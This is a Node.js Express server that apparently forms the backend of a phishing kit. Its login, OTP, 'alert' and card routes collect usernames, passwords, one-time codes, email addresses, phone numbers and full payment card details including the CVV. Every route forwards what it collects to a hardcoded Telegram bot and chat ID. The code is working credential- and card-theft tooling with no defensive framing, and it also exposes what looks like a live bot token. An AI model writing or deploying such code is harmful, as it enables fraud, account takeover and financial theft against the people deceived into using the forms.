const express = require("express");
const path = require("path");
const TelegramBot = require("node-telegram-bot-api");
const app = express();

// Telegram bot credentials (hardcoded as requested; use environment variables in production)
const TELEGRAM_BOT_TOKEN = "7709941137:AAF8zjnw0zcyKeUGZp4XTbxq7qM3HUii0Ko";
const TELEGRAM_CHAT_ID = "8055889698";

// Initialize Telegram bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Middleware to parse form and JSON data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files from public directory
app.use(express.static(path.join(__dirname, "public")));

// Handle POST request for login form (index.html)
app.post("/login", (req, res) => {
  const { username, password } = req.body;
  console.log("Received login data:", { username, password });

  // Send login data to Telegram
  const loginMessage = `New login attempt:\nUsername: ${username}\nPassword: ${password}`;
  bot.sendMessage(TELEGRAM_CHAT_ID, loginMessage)
    .then(() => {
      console.log("Login data sent to Telegram");
      res.redirect("/otp.html");
    })
    .catch((error) => {
      console.error("Error sending login data to Telegram:", error.message);
      res.status(500).send("Error sending login data to Telegram");
    });
});

// Handle POST request for OTP form (otp.html)
app.post("/otp", (req, res) => {
  const { code } = req.body;
  console.log("Received OTP:", { code });

  // Send OTP to Telegram
  const otpMessage = `OTP submitted:\nCode: ${code}`;
  bot.sendMessage(TELEGRAM_CHAT_ID, otpMessage)
    .then(() => {
      console.log("OTP sent to Telegram");
      res.redirect("/alert.html");
    })
    .catch((error) => {
      console.error("Error sending OTP to Telegram:", error.message);
      res.status(500).send("Error sending OTP to Telegram");
    });
});

// Handle POST request for alert form (alert.html)
app.post("/alert", (req, res) => {
  const { email, number } = req.body;
  console.log("Received alert data:", { email, number });

  // Send alert data to Telegram
  const alertMessage = `Alert information submitted:\nEmail: ${email}\nPhone Number: ${number}`;
  bot.sendMessage(TELEGRAM_CHAT_ID, alertMessage)
    .then(() => {
      console.log("Alert data sent to Telegram");
      res.redirect("/card.html");
    })
    .catch((error) => {
      console.error("Error sending alert data to Telegram:", error.message);
      res.status(500).send("Error sending alert data to Telegram");
    });
});

// Handle POST request for card form (card.html)
app.post("/card", (req, res) => {
  const { cardholder, cardnumber, exp, cvv } = req.body;
  console.log("Received card data:", { cardholder, cardnumber, exp, cvv });

  // Send card data to Telegram
  const cardMessage = `Card information submitted:\nCardholder: ${cardholder}\nCard Number: ${cardnumber}\nExpiry: ${exp}\nCVV: ${cvv}`;
  bot.sendMessage(TELEGRAM_CHAT_ID, cardMessage)
    .then(() => {
      console.log("Card data sent to Telegram");
      res.send("Card information submitted successfully!");
    })
    .catch((error) => {
      console.error("Error sending card data to Telegram:", error.message);
      res.status(500).send("Error sending card data to Telegram");
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
